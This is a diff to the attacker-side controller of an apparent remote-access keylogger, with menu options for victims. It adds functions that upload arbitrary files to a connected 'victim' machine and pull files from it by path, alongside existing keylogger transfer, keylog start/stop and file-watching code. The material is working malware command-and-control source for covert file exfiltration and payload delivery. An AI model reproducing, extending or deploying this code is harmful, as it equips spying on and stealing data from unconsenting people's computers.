@@ -274,6 +274,61 @@ def transfer_keylog_program(sock: socket.socket, dest_ip: str, dest_port: int):
             print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
 
 
+def transfer_file(sock: socket.socket, dest_ip: str, dest_port: int):
+    # Get User Input for File + Check if Exists
+    file_path = input(constants.TRANSFER_FILE_PROMPT.format(dest_ip, dest_port))
+
+    # Check if the file exists
+    if os.path.exists(file_path):
+        print(constants.TRANSFER_FILE_FOUND_MSG.format(file_path))
+        print(constants.TRANSFER_FILE_INIT_MSG.format(file_path))
+
+        # Parse File Name
+        parsed_file_path = file_path.split("/")
+        file_name = parsed_file_path[-1]
+
+        # Send the notification to the victim that a file transfer is about to occur
+        sock.send(constants.TRANSFER_FILE_SIGNAL.encode())
+        ack = sock.recv(constants.MIN_BUFFER_SIZE).decode()
+
+        # Open and Read the file to be sent
+        if ack == constants.RECEIVED_CONFIRMATION_MSG:
+            sock.send(file_name.encode())
+            print(constants.FILE_NAME_TRANSFER_MSG.format(file_name))
+
+            # Wait for client/victim to buffer
+            time.sleep(1)
+
+            with open(file_path, 'rb') as file:
+                while True:
+                    file_data = file.read(constants.BYTE_LIMIT)
+                    if not file_data:
+                        break
+                    sock.send(file_data)
+
+            # Send end-of-file marker
+            sock.send(constants.END_OF_FILE_SIGNAL)
+
+            # Get an ACK from victim for success
+            transfer_result = sock.recv(constants.BYTE_LIMIT).decode()
+
+            if transfer_result == constants.VICTIM_ACK:
+                print(constants.FILE_TRANSFER_SUCCESSFUL.format(file_name,
+                                                                dest_ip,
+                                                                dest_port))
+                print(constants.RETURN_MAIN_MENU_MSG)
+                print(constants.MENU_CLOSING_BANNER)
+            else:
+                print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
+                print(constants.RETURN_MAIN_MENU_MSG)
+                print(constants.MENU_CLOSING_BANNER)
+    else:
+        print(constants.FILE_NOT_FOUND_ERROR.format(file_path))
+        print(constants.RETURN_MAIN_MENU_MSG)
+        print(constants.MENU_CLOSING_BANNER)
+        return None
+
+
 def is_file_openable(file_path):
     try:
         with open(file_path, constants.READ_MODE) as file:
@@ -586,6 +641,7 @@ def __perform_menu_item_2_helper(client_dict: dict, client_socket: socket.socket
 
     # Check keylog status
     if not __is_keylogging(status, target_ip, target_port, constants.STOP_KEYLOG_STATUS_FALSE):
+        print(constants.STOP_KEYLOG_STATUS_FALSE.format(target_ip, target_port))
         print(constants.RETURN_MAIN_MENU_MSG)
         print(constants.MENU_CLOSING_BANNER)
         return None
@@ -706,6 +762,63 @@ def perform_menu_item_4(client_dict: dict):
                 __perform_menu_item_4_helper(target_socket, target_ip, target_port)
         else:
             print(constants.TARGET_VICTIM_NOT_FOUND)
+
+
+def receive_file(client_socket: socket.socket, client_ip: str, client_port: int):
+    # Send Signal
+    print(constants.GET_FILE_SIGNAL_MSG)
+    client_socket.send(constants.GET_FILE_SIGNAL.encode())
+
+    # Get ACK and user file path, check if exists
+    res = client_socket.recv(constants.MIN_BUFFER_SIZE).decode()
+
+    if res == constants.RECEIVED_CONFIRMATION_MSG:
+        # Get user prompt + send to client
+        file_path = input(constants.GET_FILE_PROMPT.format(client_ip, client_port))
+        file_name = file_path.split("/")[-1]
+        client_socket.send(file_path.encode())
+
+        # Wait for response
+        res = client_socket.recv(constants.BYTE_LIMIT).decode()
+
+        # Receive File if exists (MUST DO: put in downloads/[client_ip])
+        if res == constants.GET_FILE_EXIST:
+            with open(file_name, constants.WRITE_BINARY_MODE) as file:
+                eof_marker = constants.FILE_END_OF_FILE_SIGNAL  # Define the end-of-file marker
+
+                while True:
+                    file_data = client_socket.recv(1024)
+                    if not file_data:
+                        break  # No more data received
+                    if file_data.endswith(eof_marker):
+                        file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
+                        break
+                    else:
+                        file.write(file_data)
+
+            # Send ACK to victim (if good)
+            if is_file_openable(file_name):
+                print(constants.TRANSFER_SUCCESS_MSG.format(file_name))
+                client_socket.send(constants.VICTIM_ACK.encode())
+                print(constants.RETURN_MAIN_MENU_MSG)
+                print(constants.MENU_CLOSING_BANNER)
+                return None
+            else:
+                client_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
+                print(constants.RETURN_MAIN_MENU_MSG)
+                print(constants.MENU_CLOSING_BANNER)
+                return None
+
+        else:  # If file does not exist...
+            print(constants.GET_FILE_NOT_EXIST_MSG.format(file_path, client_ip, client_port))
+            print(constants.RETURN_MAIN_MENU_MSG)
+            print(constants.MENU_CLOSING_BANNER)
+            return None
+    else:
+        print(constants.GET_FILE_ERROR)
+        print(constants.RETURN_MAIN_MENU_MSG)
+        print(constants.MENU_CLOSING_BANNER)
+        return None
 
 
 def __perform_menu_item_4_helper(client_socket: socket.socket, client_ip: str, client_port: int):
@@ -913,7 +1026,6 @@ def __perform_menu_item_9_helper(client_dict: dict, client_socket: socket.socket
             print("[+] Now watching file {} from client ({}, {})...".format(filename,
                                                                             target_ip,
                                                                             target_port))
-            print(global_thread)
 
             # a) Create downloads/victim_ip directory (if necessary)
             sub_directory_path = make_main_and_sub_directories(target_ip)
